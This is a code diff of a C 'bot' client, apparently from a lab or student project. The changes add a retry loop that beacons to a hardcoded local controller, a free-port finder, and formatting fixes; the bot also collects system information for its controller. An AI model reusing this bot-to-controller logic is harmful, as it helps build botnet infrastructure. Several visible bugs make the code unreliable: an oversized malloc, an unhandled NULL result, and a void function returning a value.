@@ -1,9 +1,9 @@
 #include "bot.h"
 
-char host[256];
-char *IP;
+char host[256] = {0};
+char *IP = {0};
 long port = 2324;
-int ret;
+int ret = 0;
 struct MHD_Daemon *mhd_daemon;
 
 int main(int argc, char const *argv[])
@@ -15,13 +15,22 @@ int main(int argc, char const *argv[])
      * react to commands: HTTP_REQ -> EMAIL -> SYS_INFO
      * after performing such operation inform controller that operation has ended
      */
-
     setBotIP();
+    setBotPort();
 
+    ret = -1;
 
-    ret = connectToController();
-    if (ret < 0)
-        handle_error("Could not connect to controller");
+    while (ret < 0)
+    {
+        ret = connectToController();
+
+        if (ret < 0)
+        {
+            printf("\nConnection failed retry after 15 seconds");
+        }
+        fflush(stdout);
+        sleep(15);
+    }
 
     const union MHD_ConnectionInfo *conninfo;
 
@@ -36,7 +45,7 @@ int main(int argc, char const *argv[])
 
     while (1)
     {
-    };
+    }
     return 0;
 }
 
@@ -50,10 +59,14 @@ int connectToController()
         handle_error("Could not execute command, error initializing curl handle");
 
     // * ### BUILD URL ###
-    char *url = (char *)malloc(sizeof(PROTOCOL) + sizeof(IP) + sizeof(C_PORT) + sizeof(C_IP) + 5);
+    char *url  = (char *)malloc(sizeof(char)*strlen(PROTOCOL)*strlen(IP)*strlen(C_PORT)*strlen(C_IP) + sizeof(long) * 5);
+    if(url == NULL){
+        printf("DAMN");
+    }
 
     strcpy(url, PROTOCOL);
-    strcat(url, getenv(CONTROLLER_IP));
+    strcat(url, "127.0.1.1");
+    // strcat(url, getenv(CONTROLLER_IP));
 
     char *query = (char *)malloc(16 + sizeof(IP) + 5);
     sprintf(query, "?PORT=%ld&IP=%s", port, IP);
@@ -70,7 +83,7 @@ int connectToController()
     // * create url
     curl_easy_setopt(curl, CURLOPT_URL, url);
 
-    printf("Connecting to controller... \n");
+    printf("\n Connecting to controller...");
     ret = curl_easy_perform(curl);
 
     // curl_easy_getinfo(curl, CURLINFO_PRIMARY_PORT, &port);
@@ -78,8 +91,10 @@ int connectToController()
     {
         long port;
         ret = curl_easy_getinfo(curl, CURLINFO_PRIMARY_PORT, &port);
-        if (!ret)
+        if (!ret){
             printf("\nConnected to remote port: %ld , url: %s\n", port, url);
+        }
+            ret = 1;
     }
     else
     {
@@ -117,7 +132,6 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
     int ret;
 
     response = MHD_create_response_from_buffer(strlen(msg), (void *)msg, MHD_RESPMEM_PERSISTENT);
-    
 
     char *endpoint;
     endpoint = strstr(url, "/http_req");
@@ -249,8 +263,8 @@ int getSystemInfo(char *info)
     return 1;
 }
 
-
-void notifyController(){
+void notifyController()
+{
 
     CURL *curl;
 
@@ -258,16 +272,16 @@ void notifyController(){
 
     if (curl == NULL)
         handle_error("Could not execute command, error initializing curl handle");
-    
-    char url[255] = {0};
-    char buff[sizeof(long)*8+1];
-    sprintf(buff,"%ld",port);
-    strcpy(url, CONTROLLER_NOTIFY_ENDPOINT);
-    strcat(url,IP);
-    strcat(url,"&PORT=");
-    strcat(url, buff );
 
-    printf("Sending notification to : %s \n",url);
+    char url[255] = {0};
+    char buff[sizeof(long) * 8 + 1];
+    sprintf(buff, "%ld", port);
+    strcpy(url, CONTROLLER_NOTIFY_ENDPOINT);
+    strcat(url, IP);
+    strcat(url, "&PORT=");
+    strcat(url, buff);
+
+    printf("Sending notification to : %s \n", url);
     curl_easy_setopt(curl, CURLOPT_URL, url);
     curl_easy_setopt(curl, CURLOPT_PORT, CONTROLLER_PORT);
 
@@ -276,6 +290,37 @@ void notifyController(){
     printf("Response : ");
 
     curl_easy_cleanup(curl);
+}
+
+void setBotPort(){
+
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd == -1) {
+        perror("socket");
+        exit(EXIT_FAILURE);
+    }
+
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+    addr.sin_port = htons(0);
+
+    if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
+        perror("bind");
+        exit(EXIT_FAILURE);
+    }
+
+    socklen_t len = sizeof(addr);
+    if (getsockname(sockfd, (struct sockaddr*)&addr, &len) == -1) {
+        perror("getsockname");
+        exit(EXIT_FAILURE);
+    }
+
+    port = (long) ntohs(addr.sin_port);
+    printf("Free port: %ld\n", port);
+
+    close(sockfd);
+    return 0;
 
 
 }
